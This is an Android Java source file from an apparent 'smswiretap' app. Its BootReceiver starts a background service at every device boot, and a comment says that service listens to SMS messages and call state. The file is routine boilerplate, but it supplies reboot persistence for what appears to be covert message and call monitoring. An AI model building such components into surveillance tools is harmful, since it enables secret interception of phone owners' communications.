package com.ckz.smswiretap.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.ckz.smswiretap.utils.ServiceTools;

/**
 * 接收系统开机广播 android.permission.RECEIVE_BOOT_COMPLETED
 * 4.x系统需要用户运行一次，才能开机接收
 * @author Administrator
 *
 */
public class BootReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		//开机广播
		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
			// 这里我设置的是开机要打开一个activity+service，实际开发中可能只需要启动service就可以了；
			// ---------声明一个Intent,打开一个Activity;
			//Intent intent_Activity = new Intent(context, MainActivity.class);
			// 设置启动的Action,不是强制的；  
			//intent_Activity.setAction("android.intent.action.MAIN");
			// 添加category，,不是强制的；
			//intent_Activity.addCategory("android.intent.category.LAUNCHER");
			/*
			 * 如果活动是在不活动的环境下展开，这个标志是强制性的设置，必须加；
			 * 为刚要启动的Activity设置启动参数，此参数申明启动时为Activity开辟新的栈。
			 */
			//intent_Activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			// 启动activity
			//context.startActivity(intent_Activity);
			// --------声明一个Intent用以启动一个Service;

			//开启服务进行监听短信或通话状态
			boolean b = ServiceTools.isServiceRunning(context, "com.ckz.smswiretap.service.StartService");
			if(!b){
				Intent inte = new Intent(context, StartService.class);
				context.startService(inte);
			}
		}
	}

}
